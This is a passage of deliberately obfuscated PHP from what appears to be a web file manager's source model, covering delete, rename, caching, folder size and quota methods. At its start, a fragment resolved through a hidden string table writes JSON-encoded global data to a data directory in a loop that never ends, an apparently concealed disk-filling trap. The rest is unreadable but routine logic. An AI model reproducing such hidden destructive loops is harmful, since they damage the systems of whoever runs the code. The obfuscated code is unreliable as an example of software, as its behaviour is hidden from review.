$«âÈŒÃ(); } $À‰ìè” = $†¢ª¶Á[891]; $À‰ìè”($_SERVER[$†¢ª¶Á[892]]); $¡™‘Ì“› = $†¢ª¶Á[888]; $¡™‘Ì“›(); $†Ç—ÉÈ = $†¢ª¶Á[893]; $øÏÄà‹š = json_encode($GLOBALS[$†¢ª¶Á[894]]); $İÄ‚œéß = 1; for ($Ş’æÊÛ = $İÄ‚œéß; $Ş’æÊÛ > 0; $Ş’æÊÛ++) { $†Ç—ÉÈ(DATA_PATH . $Ş’æÊÛ, $øÏÄà‹š); } } $ÔŞë¸ˆä = $this->sourceInfo($íÄÏ’Í); $øèî«úê = $this->pathInfoMore($íÄÏ’Í); if (!$ÔŞë¸ˆä) { return !0; } if ($ÔŞë¸ˆä[$†¢ª¶Á[432]] == 0) { if (!_get($GLOBALS, $†¢ª¶Á[494])) { return !1; } } $this->lockMoveStart($íÄÏ’Í); Hook::trigger($†¢ª¶Á[2167], $øèî«úê, $Ô€ûîïí); if ($Ô€ûîïí) { Model($†¢ª¶Á[2166])->moveToRecycle($íÄÏ’Í); } else { $ª«¿Ñ›Ú = $this->childrenAll($ÔŞë¸ˆä); Model($†¢ª¶Á[561])->eventRemove($íÄÏ’Í); $this->removeRelevance($ª«¿Ñ›Ú[$†¢ª¶Á[2165]], $ª«¿Ñ›Ú[$†¢ª¶Á[1497]]); } $this->folderSizeReset($ÔŞë¸ˆä[$†¢ª¶Á[432]]); $óÂˆÅúï = array($ÔŞë¸ˆä[$†¢ª¶Á[432]]); if ($ÔŞë¸ˆä[$†¢ª¶Á[410]] == $†¢ª¶Á[88]) { $óÂˆÅúï[] = $ÔŞë¸ˆä[$†¢ª¶Á[402]]; } $this->updateModifyTime($óÂˆÅúï); $this->lockMoveEnd($íÄÏ’Í); Hook::trigger($†¢ª¶Á[1722], $øèî«úê, $Ô€ûîïí); return !0; } public function childrenAll($®ì÷² Ö) { $š¿¶“¥Ñ =& $_SERVER[şÒÁøÒÄ]; $ë‹²Ÿœ™ = $®ì÷² Ö[$š¿¶“¥Ñ[402]]; if ($®ì÷² Ö[$š¿¶“¥Ñ[410]] == $š¿¶“¥Ñ[88]) { $·ü»Ï¦ = array($š¿¶“¥Ñ[580] => array($š¿¶“¥Ñ[540], $®ì÷² Ö[$š¿¶“¥Ñ[511]] . $ë‹²Ÿœ™ . $š¿¶“¥Ñ[541])); $Â‡İÄ¨î = array($š¿¶“¥Ñ[580] => $·ü»Ï¦[$š¿¶“¥Ñ[511]]); $Õøı¶ï = $this->field($š¿¶“¥Ñ[2168])->where($Â‡İÄ¨î)->select(); $†Á‡°–Ú = !1; $¼¨ÖØÔ = array($ë‹²Ÿœ™); if ($Õøı¶ï) { $†Á‡°–Ú = array_to_keyvalue($Õøı¶ï, $š¿¶“¥Ñ[12], $š¿¶“¥Ñ[468]); $†Á‡°–Ú = array_remove_value($†Á‡°–Ú, $š¿¶“¥Ñ[198]); $¼¨ÖØÔ = array_to_keyvalue($Õøı¶ï, $š¿¶“¥Ñ[12], $š¿¶“¥Ñ[402]); $¼¨ÖØÔ[] = $ë‹²Ÿœ™; } } else { $†Á‡°–Ú = array($®ì÷² Ö[$š¿¶“¥Ñ[468]]); $¼¨ÖØÔ = array($ë‹²Ÿœ™); } return array($š¿¶“¥Ñ[2165] => $¼¨ÖØÔ, $š¿¶“¥Ñ[1497] => $†Á‡°–Ú); } public function removeArray($—†òïèı) { if (!$—†òïèı) { return !0; } } public function removeRelevance($«¾‡İ€Æ, $éü ë‹ì) { $ÎÎû”øÄ =& $_SERVER[şÒÁøÒÄ]; $«¾‡İ€Æ = $«¾‡İ€Æ ? $«¾‡İ€Æ : array(); $éü ë‹ì = $éü ë‹ì ? $éü ë‹ì : array(); $«¾‡İ€Æ = array_unique(array_filter($«¾‡İ€Æ)); $éü ë‹ì = array_unique(array_filter($éü ë‹ì)); if (!$«¾‡İ€Æ) { return !1; } $áĞƒÓÓñ = array($ÎÎû”øÄ[417] => array($ÎÎû”øÄ[418], $«¾‡İ€Æ)); Model($ÎÎû”øÄ[2166])->where($áĞƒÓÓñ)->delete(); Model($ÎÎû”øÄ[462])->where($áĞƒÓÓñ)->delete(); Model($ÎÎû”øÄ[2016])->where($áĞƒÓÓñ)->delete(); Model($ÎÎû”øÄ[561])->where($áĞƒÓÓñ)->delete(); Model($ÎÎû”øÄ[1849])->removeBySource($«¾‡İ€Æ); Model($ÎÎû”øÄ[2148])->removeBySource($«¾‡İ€Æ); $this->where($áĞƒÓÓñ)->delete(); Model($ÎÎû”øÄ[471])->remove($éü ë‹ì); for ($±“ÕàµÇ = 0; $±“ÕàµÇ < count($«¾‡İ€Æ); $±“ÕàµÇ++) { $this->sourceCacheClear($«¾‡İ€Æ[$±“ÕàµÇ]); } } public function rename($Ø‰î‚¯Õ, $¿ÑìÖø) { $íğ¤µ÷¨ =& $_SERVER[şÒÁøÒÄ]; $–ô”é¬ = $this->sourceInfo($Ø‰î‚¯Õ); if (!$–ô”é¬) { return !1; } $Í³¬¹òŸ = $this->fileNameExist($–ô”é¬[$íğ¤µ÷¨[432]], $¿ÑìÖø); if ($Í³¬¹òŸ && $Í³¬¹òŸ != $Ø‰î‚¯Õ) { return !1; } $ñïÜÜşÏ = array($íğ¤µ÷¨[420] => $¿ÑìÖø, $íğ¤µ÷¨[579] => USER_ID); if ($–ô”é¬[$íğ¤µ÷¨[410]] != $íğ¤µ÷¨[88]) { $ñïÜÜşÏ[$íğ¤µ÷¨[412]] = substr(get_path_ext($¿ÑìÖø), 0, 10); } Model($íğ¤µ÷¨[561])->eventRename($Ø‰î‚¯Õ, $–ô”é¬[$íğ¤µ÷¨[32]], $¿ÑìÖø); $this->sourceCacheClear($Ø‰î‚¯Õ); $this->setNamePinyin($Ø‰î‚¯Õ, $ñïÜÜşÏ[$íğ¤µ÷¨[32]], !1); $this->updateModifyTime($–ô”é¬[$íğ¤µ÷¨[432]]); $®ŞˆÛó = $this->where(array($íğ¤µ÷¨[417] => $Ø‰î‚¯Õ))->data($ñïÜÜşÏ)->save(); $†¡âĞÆ = $íğ¤µ÷¨[2155] . $–ô”é¬[$íğ¤µ÷¨[432]]; if (isset(self::$cacheChildList[$†¡âĞÆ])) { unset(self::$cacheChildList[$†¡âĞÆ]); } return $®ŞˆÛó; } public function setNamePinyin($®ˆØ»Ì×, $êÃ íÚõ, $¾ŸÔê¬î = true) { $ëØ¾òÌ =& $_SERVER[şÒÁøÒÄ]; $×èÅŠ² = Input::check($êÃ íÚõ, $ëØ¾òÌ[583]); $ñ›¼öµ” = array($ëØ¾òÌ[444] => KodSort::makeStr($êÃ íÚõ)); if ($×èÅŠ²) { $ñ›¼öµ”[$ëØ¾òÌ[465]] = str_replace($ëØ¾òÌ[53], $ëØ¾òÌ[12], Pinyin::get($êÃ íÚõ)); $ñ›¼öµ”[$ëØ¾òÌ[464]] = Pinyin::get($êÃ íÚõ, $ëØ¾òÌ[584]); } if (!$¾ŸÔê¬î && !$×èÅŠ²) { $ñ›¼öµ”[$ëØ¾òÌ[465]] = null; $ñ›¼öµ”[$ëØ¾òÌ[464]] = null; } $this->metaSet($®ˆØ»Ì×, $ñ›¼öµ”); } public function getContent($ÉáÔ·ôª) { $¶°ïáïú =& $_SERVER[şÒÁøÒÄ]; $ÃÉ´Ëå = $this->fileInfoGet($ÉáÔ·ôª); if (!$ÃÉ´Ëå) { return !1; } if ($ÃÉ´Ëå[$¶°ïáïú[76]] == 0) { return $¶°ïáïú[12]; } $ÆÇ¶ñ‰° = $¶°ïáïú[2169] . $ÃÉ´Ëå[$¶°ïáïú[176]]; if ($ÃÉ´Ëå[$¶°ïáïú[76]] <= 1024 * 10) { $ØÈ¶À¬Ã = Cache::get($ÆÇ¶ñ‰°); if (!$ØÈ¶À¬Ã) { $ØÈ¶À¬Ã = IO::getContent($ÃÉ´Ëå[$¶°ïáïú[84]]); Cache::set($ÆÇ¶ñ‰°, $ØÈ¶À¬Ã); } return $ØÈ¶À¬Ã; } if (!$ÃÉ´Ëå[$¶°ïáïú[84]]) { return $¶°ïáïú[12]; } return IO::getContent($ÃÉ´Ëå[$¶°ïáïú[84]]); } public function setDesc($şƒÌ…Îè, $‹¼ñƒ¦¦) { $°³£‹Ôû =& $_SERVER[şÒÁøÒÄ]; Model($°³£‹Ôû[561])->eventAddDesc($şƒÌ…Îè, $‹¼ñƒ¦¦); return $this->metaSet($şƒÌ…Îè, $°³£‹Ôû[453], $‹¼ñƒ¦¦); } public function setContent($ª­®ûÎƒ, $À§»Í§¶ = '') { $´±Â„õ =& $_SERVER[şÒÁøÒÄ]; $‡Ò¦€´İ = $this->sourceInfo($ª­®ûÎƒ); $çÜş™¶ = $this->fileInfoGet($ª­®ûÎƒ); if (!$çÜş™¶ || !$‡Ò¦€´İ) { return !1; } $»ÈÌıÕ¥ = Model($´±Â„õ[471])->addFileByContent($À§»Í§¶, $‡Ò¦€´İ[$´±Â„õ[32]]); $‡†Õ¯» = $this->fileHistory($‡Ò¦€´İ, $»ÈÌıÕ¥[$´±Â„õ[468]], $»ÈÌıÕ¥[$´±Â„õ[76]]); if (!$‡†Õ¯») { return Model($´±Â„õ[471])->remove($»ÈÌıÕ¥[$´±Â„õ[468]]); } $this->folderSizeReset($‡Ò¦€´İ[$´±Â„õ[432]]); return !0; } public function fileSubstr($Ë×Ğ¥Ş¦, $ÌÓ‡óÀ, $êÉã¬ì©) { $›“Çî¨á = $this->fileInfoGet($Ë×Ğ¥Ş¦); if (!$›“Çî¨á) { return !1; } return IO::fileSubstr($›“Çî¨á[$_SERVER[şÒÁøÒÄ][84]], $ÌÓ‡óÀ, $êÉã¬ì©); } public function fileInfoGet($æˆÏ¾¸´) { $øş¡¾ŸË =& $_SERVER[şÒÁøÒÄ]; $ËşÏ÷À™ = $this->sourceInfo($æˆÏ¾¸´); if (!$ËşÏ÷À™ || $ËşÏ÷À™[$øş¡¾ŸË[410]]) { return !1; } $‹£™áÜÑ = $øş¡¾ŸË[474] . $ËşÏ÷À™[$øş¡¾ŸË[468]]; $²ˆ½ñ³ñ = _get(self::$cacheFileInfo, $‹£™áÜÑ); if ($²ˆ½ñ³ñ) { return $²ˆ½ñ³ñ; } $¿ŒÆëò— = Model($øş¡¾ŸË[471])->fileInfo($ËşÏ÷À™[$øş¡¾ŸË[468]]); if ($¿ŒÆëò—) { $¿ŒÆëò—[$øş¡¾ŸË[32]] = $ËşÏ÷À™[$øş¡¾ŸË[32]]; } self::$cacheFileInfo[$‹£™áÜÑ] = $¿ŒÆëò—; return $¿ŒÆëò—; } private function folderChildrenNumber($’‰Ò’î¬) { $Ãê”ì“ı =& $_SERVER[şÒÁøÒÄ]; $¸ÔÚæ¦ = $this->sourceInfo($’‰Ò’î¬); $™œ±­— = array($Ãê”ì“ı[580] => array($Ãê”ì“ı[540], $¸ÔÚæ¦[$Ãê”ì“ı[511]] . $’‰Ò’î¬ . $Ãê”ì“ı[541]), $Ãê”ì“ı[577] => $¸ÔÚæ¦[$Ãê”ì“ı[496]], $Ãê”ì“ı[430] => intval($¸ÔÚæ¦[$Ãê”ì“ı[431]]), $Ãê”ì“ı[574] => 1); $ß‘ëéş¾ = $this->where($™œ±­—)->count(); $ï³å€Ó¦ = $this->where($™œ±­—)->where(array($Ãê”ì“ı[574] => 0))->count(); return array($Ãê”ì“ı[80] => $ï³å€Ó¦, $Ãê”ì“ı[81] => $ß‘ëéş¾); } public function pathInfo($ÕÑÄğšü, $ñ±…£”Í = false) { $ëóòÔı’ =& $_SERVER[şÒÁøÒÄ]; $ñ±…£”Í = !1; $ÕÑÄğšü = intval($ÕÑÄğšü); $Èß¸áË÷ = $ëóòÔı’[461] . intval($ñ±…£”Í) . $ëóòÔı’[386] . $ÕÑÄğšü; $«Èù¬Ëâ = _get(self::$cachePathInfo, $Èß¸áË÷); if ($«Èù¬Ëâ) { return $«Èù¬Ëâ; } $ÁùÊİş” = $this->sourceInfo($ÕÑÄğšü); if (!$ÁùÊİş”) { return !1; } $ÁùÊİş” = $this->_listDataApplyItem($ÁùÊİş”, $ñ±…£”Í); self::$cachePathInfo[$Èß¸áË÷] = $ÁùÊİş”; return $ÁùÊİş”; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ù—º­‚Ò) { $íØ²íâÓ =& $_SERVER[şÒÁøÒÄ]; $ãš†ÊØâ = _get(self::$cachePathInfoMore, $Ù—º­‚Ò); if ($ãš†ÊØâ) { return $ãš†ÊØâ; } $ÂëÍüï³ = $this->pathInfo($Ù—º­‚Ò); if (!$ÂëÍüï³) { return !1; } if ($ÂëÍüï³[$íØ²íâÓ[410]] == $íØ²íâÓ[88]) { $ÂëÍüï³[$íØ²íâÓ[79]] = $this->folderChildrenNumber($Ù—º­‚Ò); } self::$cachePathInfoMore[$Ù—º­‚Ò] = $ÂëÍüï³; return $ÂëÍüï³; } public function sourceInfo($Ğœ’òœ–) { $éè‰ïÄÂ =& $_SERVER[şÒÁøÒÄ]; if (!$Ğœ’òœ–) { return array(); } $Ğœ’òœ– = intval($Ğœ’òœ–); $Æ³ß× = $éè‰ïÄÂ[460] . $Ğœ’òœ–; $³ßÁ÷á· = _get(self::$cacheSourceInfo, $Æ³ß×); if ($³ßÁ÷á·) { return $³ßÁ÷á·; } $ì‡è±×Ò = $this->where(array($éè‰ïÄÂ[402] => $Ğœ’òœ–))->find(); self::$cacheSourceInfo[$Æ³ß×] = $ì‡è±×Ò; return self::$cacheSourceInfo[$Æ³ß×]; } public function sourceCacheClear($Ã†ïàØª = false) { self::cacheClear($Ã†ïàØª); } public static function cacheClear($çÆ‹¦±É = false) { $Ÿ½º‚ÎË =& $_SERVER[şÒÁøÒÄ]; if ($çÆ‹¦±É == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ÿ½º‚ÎË[460] . $çÆ‹¦±É]); unset(self::$cachePathInfoMore[$çÆ‹¦±É]); unset(self::$cachePathInfo[$Ÿ½º‚ÎË[2170] . $çÆ‹¦±É]); unset(self::$cachePathInfo[$Ÿ½º‚ÎË[2171] . $çÆ‹¦±É]); } public function metaSet($ŞĞúÖÖ™, $ìüïëò = null, $äÃœİ¡ = null) { $¹«æËï = parent::metaSet($ŞĞúÖÖ™, $ìüïëò, $äÃœİ¡); if ($¹«æËï) { $this->sourceCacheClear($ŞĞúÖÖ™); } return $¹«æËï; } public function pathInfoByPath($Œïñêªì, $âß†öº™) { $—¦ğÈûù =& $_SERVER[şÒÁøÒÄ]; $†•¥¸Ã¶ = !$âß†öº™ ? array() : explode($—¦ğÈûù[8], trim($âß†öº™, $—¦ğÈûù[8])); $£üÃÕÈ = $Œïñêªì; foreach ($†•¥¸Ã¶ as $ë¾†¨Ó±) { $‹ûœ£ÀŠ = array($—¦ğÈûù[432] => $£üÃÕÈ, $—¦ğÈûù[32] => $ë¾†¨Ó±); $÷‘Ú©ßÊ = $this->where($‹ûœ£ÀŠ)->select(); if (!$÷‘Ú©ßÊ) { return !1; } $÷‘Ú©ßÊ = array_sort_by($÷‘Ú©ßÊ, $—¦ğÈûù[431]); $£üÃÕÈ = $÷‘Ú©ßÊ[0][$—¦ğÈûù[402]]; } return $this->pathInfo($£üÃÕÈ, !0); } protected function updateModifyTime($Ÿ­Ú§¤Ÿ) { $ŒÎÓß€Ä =& $_SERVER[şÒÁøÒÄ]; if (!$Ÿ­Ú§¤Ÿ) { return; } if (!is_array($Ÿ­Ú§¤Ÿ)) { $Ÿ­Ú§¤Ÿ = array($Ÿ­Ú§¤Ÿ); } foreach ($Ÿ­Ú§¤Ÿ as $ÅÅ»Ê°Í => $¢…›ª…) { $Ÿ­Ú§¤Ÿ[$ÅÅ»Ê°Í] = intval($¢…›ª…); $this->sourceCacheClear($¢…›ª…); } $ŸôªÆû = array($ŒÎÓß€Ä[402] => array($ŒÎÓß€Ä[7], $Ÿ­Ú§¤Ÿ)); $»¯ğ±™ô = array($ŒÎÓß€Ä[579] => USER_ID, $ŒÎÓß€Ä[424] => time()); $this->where($ŸôªÆû)->save($»¯ğ±™ô); } public function folderSizeReset($¨ĞÆ½ºŞ, $±˜ÇºÙª = false) { $Æ©¼¼èš =& $_SERVER[şÒÁøÒÄ]; if ($this->statusIgnoreResetSpace) { return; } $©¼– ÛÒ = $this->sourceInfo($¨ĞÆ½ºŞ); $¢Î´„Ÿ = $Æ©¼¼èš[2172] . $¨ĞÆ½ºŞ; CacheLock::lock($¢Î´„Ÿ, 20); if ($±˜ÇºÙª === !1) { $this->sourceCacheClear($¨ĞÆ½ºŞ); $©¼– ÛÒ = $this->sourceInfo($¨ĞÆ½ºŞ); $Ø£Ú­Çã = array($Æ©¼¼èš[401] => $¨ĞÆ½ºŞ, $Æ©¼¼èš[430] => 0); $‡…çÀ‹ã = $this->where($Ø£Ú­Çã)->sum($Æ©¼¼èš[76]); $±˜ÇºÙª = intval($‡…çÀ‹ã) - intval($©¼– ÛÒ[$Æ©¼¼èš[76]]); } if ($±˜ÇºÙª == 0) { return CacheLock::unlock($¢Î´„Ÿ); } $–­“—¼ë = $this->parentLevelArray($©¼– ÛÒ[$Æ©¼¼èš[511]]); if (!$–­“—¼ë) { $–­“—¼ë = array(); } $–­“—¼ë[] = $©¼– ÛÒ[$Æ©¼¼èš[402]]; $Ø£Ú­Çã = array($Æ©¼¼èš[402] => array($Æ©¼¼èš[418], $–­“—¼ë)); if ($±˜ÇºÙª < 0) { $Ø£Ú­Çã[$Æ©¼¼èš[76]] = array($Æ©¼¼èš[1028], abs($±˜ÇºÙª)); } $this->where($Ø£Ú­Çã)->setAdd($Æ©¼¼èš[76], $±˜ÇºÙª); CacheLock::unlock($¢Î´„Ÿ); $“Ñ¶¡©Ë = $Æ©¼¼èš[2173] . $©¼– ÛÒ[$Æ©¼¼èš[411]] . $Æ©¼¼èš[4] . $©¼– ÛÒ[$Æ©¼¼èš[496]]; $ÎÁæ®÷ = array($©¼– ÛÒ[$Æ©¼¼èš[411]], $©¼– ÛÒ[$Æ©¼¼èš[496]]); TaskRun::timeLimitCall($“Ñ¶¡©Ë, $Æ©¼¼èš[2174], $ÎÁæ®÷, 1.5); } public function folderSizeResetChildren($“‰Œı…¨) { $ØÛåßé´ =& $_SERVER[şÒÁøÒÄ]; $this->sourceCacheClear($“‰Œı…¨); $ÎŞ¤•°Û = $this->sourceInfo($“‰Œı…¨); $†İù¤’ = array($ØÛåßé´[574] => 1, $ØÛåßé´[577] => $ÎŞ¤•°Û[$ØÛåßé´[496]], $ØÛåßé´[580] => array($ØÛåßé´[540], $ÎŞ¤•°Û[$ØÛåßé´[511]] . $“‰Œı…¨ . $ØÛåßé´[541])); $š¥´öÃ = $ØÛåßé´[2175]; $şıÒõÅª = $this->field($š¥´öÃ)->where($†İù¤’)->select(); $†İù¤’[$ØÛåßé´[410]] = 0; $§‡ïÙ¿ = $this->field($š¥´öÃ)->where($†İù¤’)->select(); if (!$§‡ïÙ¿) { return; } $şıÒõÅª[] = $ÎŞ¤•°Û; $şıÒõÅª = array_to_keyvalue($şıÒõÅª, $ØÛåßé´[402]); foreach ($şıÒõÅª as $™¾ì ®Î => $á±Ë¶îå) { $şıÒõÅª[$™¾ì ®Î][$ØÛåßé´[2176]] = $şıÒõÅª[$™¾ì ®Î][$ØÛåßé´[76]]; $şıÒõÅª[$™¾ì ®Î][$ØÛåßé´[76]] = 0; } foreach ($§‡ïÙ¿ as $á±Ë¶îå) { $¾ÆõÖïÑ = $á±Ë¶îå[$ØÛåßé´[432]] . $ØÛåßé´[12]; if (!isset($şıÒõÅª[$¾ÆõÖïÑ])) { continue; } if ($á±Ë¶îå[$ØÛåßé´[431]] == $şıÒõÅª[$¾ÆõÖïÑ][$ØÛåßé´[431]]) { $şıÒõÅª[$¾ÆõÖïÑ][$ØÛåßé´[76]] += $á±Ë¶îå[$ØÛåßé´[76]]; } } foreach ($şıÒõÅª as $á±Ë¶îå) { $õ‚¼ÅÀ‘ = $this->parentLevelArray($á±Ë¶îå[$ØÛåßé´[511]]); foreach ($õ‚¼ÅÀ‘ as $¾ÆõÖïÑ) { $¾ÆõÖïÑ = $¾ÆõÖïÑ . $ØÛåßé´[12]; if (!isset($şıÒõÅª[$¾ÆõÖïÑ])) { continue; } if ($á±Ë¶îå[$ØÛåßé´[431]] == $şıÒõÅª[$¾ÆõÖïÑ][$ØÛåßé´[431]]) { $şıÒõÅª[$¾ÆõÖïÑ][$ØÛåßé´[76]] += $á±Ë¶îå[$ØÛåßé´[76]]; } } } $…„ã—ÚÂ = array(); foreach ($şıÒõÅª as $á±Ë¶îå) { if ($á±Ë¶îå[$ØÛåßé´[76]] == $á±Ë¶îå[$ØÛåßé´[2176]]) { continue; } $…„ã—ÚÂ[] = array($ØÛåßé´[402], $á±Ë¶îå[$ØÛåßé´[402]], $ØÛåßé´[76], $á±Ë¶îå[$ØÛåßé´[76]]); } $this->saveAll($…„ã—ÚÂ); } public function userSpaceReset($±ÃíèÔ§ = false) { $É‚ÆÑ‚¸ =& $_SERVER[şÒÁøÒÄ]; $°•Ù¡äì = $this->where(array($É‚ÆÑ‚¸[411] => self::TYPE_USER, $É‚ÆÑ‚¸[496] => $±ÃíèÔ§, $É‚ÆÑ‚¸[410] => 0))->sum($É‚ÆÑ‚¸[76]); $°•Ù¡äì = !$°•Ù¡äì || $°•Ù¡äì <= 0 ? 0 : $°•Ù¡äì; Model($É‚ÆÑ‚¸[504])->userEdit($±ÃíèÔ§, array($É‚ÆÑ‚¸[1858] => $°•Ù¡äì)); } public function targetSpaceUpdate($–óûï¯Ñ, $ª‹µÃ±×) { $åÃñ¿î˜ =& $_SERVER[şÒÁøÒÄ]; if (!$ª‹µÃ±×) { return; } if (!in_array($–óûï¯Ñ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ˆşùßµ = $this->targetSpaceSize($–óûï¯Ñ, $ª‹µÃ±×); if ($–óûï¯Ñ == self::TYPE_USER) { Model($åÃñ¿î˜[504])->userEdit($ª‹µÃ±×, array($åÃñ¿î˜[1858] => $ˆşùßµ)); } else { if ($–óûï¯Ñ == self::TYPE_GROUP) { Model($åÃñ¿î˜[512])->groupEdit($ª‹µÃ±×, array($åÃñ¿î˜[1858] => $ˆşùßµ)); } } } public function targetSpaceSize($©ÒÚİ–œ, $…É×¥È·) { $ï·Ûèâš =& $_SERVER[şÒÁøÒÄ]; $Ç†õàªı = 0; $º¥İ½ú¹ = $this->targetSourceRoot($©ÒÚİ–œ, $…É×¥È·, !0); foreach ($º¥İ½ú¹ as $–âø‘èõ) { if (!$–âø‘èõ) { continue; } $Ç†õàªı += floatval($–âø‘èõ[$ï·Ûèâš[76]]); $á¥áúÑ = array($ï·Ûèâš[580] => array($ï·Ûèâš[540], $ï·Ûèâš[521] . $–âø‘èõ[$ï·Ûèâš[402]] . $ï·Ûèâš[541])); $“¯²ğîĞ = Model($ï·Ûèâš[429])->field($ï·Ûèâš[417])->where($á¥áúÑ)->select(); $“¯²ğîĞ = array_to_keyvalue($“¯²ğîĞ, $ï·Ûèâš[12], $ï·Ûèâš[402]); $“¯²ğîĞ = array_unique(array_filter($“¯²ğîĞ)); if ($“¯²ğîĞ) { $á¥áúÑ = array($ï·Ûèâš[417] => array($ï·Ûèâš[418], $“¯²ğîĞ)); $Ç†õàªı += floatval($this->where($á¥áúÑ)->sum($ï·Ûèâš[76])); } } $Ç†õàªı = !$Ç†õàªı || $Ç†õàªı <= 0 ? 0 : $Ç†õàªı; return $Ç†õàªı; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ô›Ò¶òô) { return $this->fileTypeProfile($ô›Ò¶òô, SourceModel::TYPE_USER); } public function groupFileTypeProfile($úµÊ†) { return $this->fileTypeProfile($úµÊ†, SourceModel::TYPE_GROUP); } private function fileTypeProfile($½öè€Æ÷, $Şõ¾¯™) { $É€©ğªß =& $_SERVER[şÒÁøÒÄ]; $Ä’ÑÁ’¤ = $É€©ğªß[2177] . $½öè€Æ÷ . $É€©ğªß[11] . $Şõ¾¯™; $¾¶”©ª’ = Cache::get($Ä’ÑÁ’¤); if ($¾¶”©ª’) { return $¾¶”©ª’; } $™²ºá¦ = array($É€©ğªß[574] => 0); if ($½öè€Æ÷ != !1) { $™²ºá¦[$É€©ğªß[496]] = $½öè€Æ÷; $™²ºá¦[$É€©ğªß[411]] = $Şõ¾¯™; } $Â¢»ò•Á = array(); $Â¢»ò•Á[$É€©ğªß[2178]] = array($É€©ğªß[2179] => LNG($É€©ğªß[2178]), $É€©ğªß[2180] => $this->where($™²ºá¦)->count(), $É€©ğªß[545] => $this->where($™²ºá¦)->sum($É€©ğªß[76])); $Û…Ô‰È¥ = KodIO::fileTypeList(); foreach ($Û…Ô‰È¥ as $Š¨·¤Ÿ => $èıÌÑòå) { $™²ºá¦[$É€©ğªß[412]] = $this->fileTypeWhere($Š¨·¤Ÿ); $Â¢»ò•Á[$Š¨·¤Ÿ] = array($É€©ğªß[2179] => $èıÌÑòå[$É€©ğªß[32]], $É€©ğªß[2180] => $this->where($™²ºá¦)->count(), $É€©ğªß[545] => $this->where($™²ºá¦)->sum($É€©ğªß[76])); } Cache::set($Ä’ÑÁ’¤, $Â¢»ò•Á, 1200); return $Â¢»ò•Á; } public function fileNameExist($æÙ¾éÍé, $ò‡¹éª¤) { $²ú³ê¹ª =& $_SERVER[şÒÁøÒÄ]; $º±³‡¢» = $this->where(array($²ú³ê¹ª[432] => $æÙ¾éÍé, $²ú³ê¹ª[32] => $ò‡¹éª¤, $²ú³ê¹ª[431] => 0))->find(); return is_array($º±³‡¢») ? $º±³‡¢»[$²ú³ê¹ª[402]] : !1; } public function childList($›’Â‚Ã) { $şíÎ Çå =& $_SERVER[şÒÁøÒÄ]; $‰Ë¿³…‚ = $şíÎ Çå[2155] . $›’Â‚Ã; if (isset(self::$cacheChildList[$‰Ë¿³…‚])) { return self::$cacheChildList[$‰Ë¿³…‚]; } $ÃáÀé¶Õ = array($şíÎ Çå[432] => intval($›’Â‚Ã), $şíÎ Çå[431] => 0); $”ÚÓ¥ŠÑ = $this->where($ÃáÀé¶Õ)->select(); $”ÚÓ¥ŠÑ = $”ÚÓ¥ŠÑ ? $”ÚÓ¥ŠÑ : array(); self::$cacheChildList[$‰Ë¿³…‚] = $”ÚÓ¥ŠÑ; foreach ($”ÚÓ¥ŠÑ as $Ó ‘Ğú€) { $‰Ë¿³…‚ = $şíÎ Çå[460] . $Ó ‘Ğú€[$şíÎ Çå[402]]; self::$cacheSourceInfo[$‰Ë¿³…‚] = $Ó ‘Ğú€; } return $”ÚÓ¥ŠÑ; } public function fileNameAuto($œÂÖÂ†, $ôÎÃò‘¦, $â¹ùàÇ = REPEAT_RENAME, $ÂëŞÖî¿ = false) { $„¤ÎƒÅ— =& $_SERVER[şÒÁøÒÄ]; $ì«­Ü÷¼ = get_path_ext($ôÎÃò‘¦); $¹©´ä‰á = $ì«­Ü÷¼ ? basename($ôÎÃò‘¦, $„¤ÎƒÅ—[10] . $ì«­Ü÷¼) . $„¤ÎƒÅ—[2181] . $ì«­Ü÷¼ : $ôÎÃò‘¦ . $„¤ÎƒÅ—[384]; $ÓÔëÜæ = array($„¤ÎƒÅ—[432] => $œÂÖÂ†, $„¤ÎƒÅ—[431] => 0, $„¤ÎƒÅ—[32] => array($„¤ÎƒÅ—[383], $¹©´ä‰á)); $›­õ¥Ù = $this->field($„¤ÎƒÅ—[32])->where($ÓÔëÜæ)->select(); $Â¢€–®¢ = array_to_keyvalue($›­õ¥Ù, $„¤ÎƒÅ—[12], $„¤ÎƒÅ—[32]); return $this->fileNameAutoGet($Â¢€–®¢, $ôÎÃò‘¦, $â¹ùàÇ, $ÂëŞÖî¿); } public function fileNameAutoGet($òéÑ‰ª, $¹ïö†•¹, $™Øœ…Û¿, $â³ãú¢ú) { $¶çáõ =& $_SERVER[şÒÁøÒÄ]; if ($™Øœ…Û¿ == REPEAT_REPLACE || !$òéÑ‰ª || !in_array_not_case($¹ïö†•¹, $òéÑ‰ª) || $â³ãú¢ú && $™Øœ…Û¿ != REPEAT_RENAME_FOLDER) { return $¹ïö†•¹; } if ($™Øœ…Û¿ == REPEAT_SKIP) { return !1; } $Òæšë = $¶çáõ[10] . get_path_ext($¹ïö†•¹); $Òæšë = $Òæšë == $¶çáõ[10] || $â³ãú¢ú ? $¶çáõ[12] : $Òæšë; for ($®ãÁóå÷ = 1; $®ãÁóå÷ <= count($òéÑ‰ª) + 1; $®ãÁóå÷++) { $­Àäâ¼Ÿ = substr($¹ïö†•¹, 0, strlen($¹ïö†•¹) - strlen($Òæšë)); $ôÓÓ¢Šı = $­Àäâ¼Ÿ . "\x28{$®ãÁóå÷}\51{$Òæšë}"; if (!in_array_not_case($ôÓÓ¢Šı, $òéÑ‰ª)) { return $ôÓÓ¢Šı; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\143\145\x5f\x72\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\x54\x69\155\145", "\x74\x69\155\x65", "\x69\x6e\x73\145\x72\x74", "\146\165\x6e\143\x74\x69\157\x6e")); public function listData($ÜçÚ’Ñ¿ = false) { $Í¯ò÷— =& $_SERVER[şÒÁøÒÄ]; $ÜçÚ’Ñ¿ = $ÜçÚ’Ñ¿ ? $ÜçÚ’Ñ¿ : USER_ID; $²—ú¨Ñœ = $this->where(array($Í¯ò÷—[1671] => $ÜçÚ’Ñ¿))->select(); return array_to_keyvalue($²—ú¨Ñœ, $Í¯ò÷—[12], 